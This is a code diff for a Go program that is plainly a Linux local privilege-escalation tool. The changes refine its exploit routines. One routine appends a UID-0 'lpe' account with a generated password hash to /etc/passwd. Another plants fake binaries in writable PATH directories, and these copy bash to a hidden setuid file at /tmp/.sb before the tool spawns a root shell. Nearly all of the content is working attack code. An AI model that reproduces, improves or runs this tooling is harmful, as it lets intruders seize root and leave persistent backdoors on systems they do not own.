@@ -1,7 +1,6 @@
 package main
 
 import (
-	"crypto/sha512"
 	"fmt"
 	"os"
 	"os/exec"
@@ -122,10 +121,12 @@ func cryptSHA512(password, salt string) string {
 	if err == nil && len(out) > 0 {
 		return strings.TrimSpace(string(out))
 	}
-	// Fallback: use python3.
+	// Fallback: use python3 — pass password/salt as argv to avoid
+	// injection if either ever contains a quote.
 	if hasBin("python3") {
 		py := exec.Command("python3", "-c",
-			fmt.Sprintf("import crypt;print(crypt.crypt('%s','$6$%s'))", password, salt))
+			"import crypt,sys;print(crypt.crypt(sys.argv[1],sys.argv[2]))",
+			password, "$6$"+salt)
 		out, err := py.Output()
 		if err == nil && len(out) > 0 {
 			return strings.TrimSpace(string(out))
@@ -134,7 +135,8 @@ func cryptSHA512(password, salt string) string {
 	// Last resort: perl.
 	if hasBin("perl") {
 		pl := exec.Command("perl", "-e",
-			fmt.Sprintf("print crypt('%s','$6$%s')", password, salt))
+			`print crypt($ARGV[0],$ARGV[1])`,
+			password, "$6$"+salt)
 		out, err := pl.Output()
 		if err == nil && len(out) > 0 {
 			return strings.TrimSpace(string(out))
@@ -155,7 +157,7 @@ func tryRootAfter(name, cmd string, timeout int) bool {
 func spawnIfRoot(name string, r *runResult, stop *bool) bool {
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
-			shellSpawned = rootspawn(r)
+			shellSpawned.Store(rootspawn(r))
 		}
 		*stop = true
 		return true
@@ -175,9 +177,8 @@ func misconfigPasswd(s *systemInfo, stop *bool) bool {
 		warnf("cannot generate password hash")
 		return false
 	}
-	entry := fmt.Sprintf("lpe:$6$%s:%s:0:0:root:/root:/bin/bash\n", hash[:0], hash)
-	// Just use the hash directly.
-	entry = fmt.Sprintf("lpe:%s:0:0:root:/root:/bin/bash\n", hash)
+	// hash already includes the "$6$salt$" prefix from openssl passwd -6.
+	entry := fmt.Sprintf("lpe:%s:0:0:root:/root:/bin/bash\n", hash)
 	f, err := os.OpenFile("/etc/passwd", os.O_WRONLY|os.O_APPEND, 0)
 	if err != nil {
 		return false
@@ -389,7 +390,7 @@ func misconfigCaps(s *systemInfo, stop *bool) bool {
 	if !hasBin("getcap") {
 		return false
 	}
-	out := cmdOutT(15, "getcap", "-r", "/", "2>/dev/null")
+	out := cmdOutT(15, "getcap", "-r", "/")
 	if out == "" {
 		return false
 	}
@@ -713,6 +714,9 @@ func misconfigSnapd(s *systemInfo, stop *bool) bool {
 func misconfigPathHijack(s *systemInfo, stop *bool) bool {
 	// Find writable directories in PATH.
 	pathDirs := strings.Split(os.Getenv("PATH"), ":")
+	// Hoist scanSUID outside the loop — it scans 12+ directories and
+	// returns identical results for every writable PATH dir.
+	suids := scanSUID()
 	for _, d := range pathDirs {
 		if d == "" {
 			continue
@@ -721,7 +725,6 @@ func misconfigPathHijack(s *systemInfo, stop *bool) bool {
 			continue
 		}
 		// Check if any SUID binary calls commands by relative name.
-		suids := scanSUID()
 		for _, suid := range suids {
 			// Use strings to find command names.
 			out, err := exec.Command("strings", suid).Output()
@@ -735,10 +738,10 @@ func misconfigPathHijack(s *systemInfo, stop *bool) bool {
 					continue
 				}
 				// Check if it's a real binary name.
-				if _, err := exec.LookPath(line); err == nil {
+				if realPath, err := exec.LookPath(line); err == nil {
 					// Plant a fake binary.
 					fakePath := filepath.Join(d, line)
-					payload := fmt.Sprintf("#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\nexec /usr/bin/%s \"$@\"\n", line)
+					payload := fmt.Sprintf("#!/bin/sh\ncp /bin/bash /tmp/.sb; chmod +s /tmp/.sb\nexec %s \"$@\"\n", realPath)
 					_ = os.WriteFile(fakePath, []byte(payload), 0o755)
 					infof("Planted PATH hijack: %s → %s", line, fakePath)
 					// Run the SUID binary.
@@ -754,9 +757,3 @@ func misconfigPathHijack(s *systemInfo, stop *bool) bool {
 	}
 	return false
 }
-
-// Ensure unused imports are referenced.
-var (
-	_ = sha512.New
-	_ = fmt.Sprintf
-)
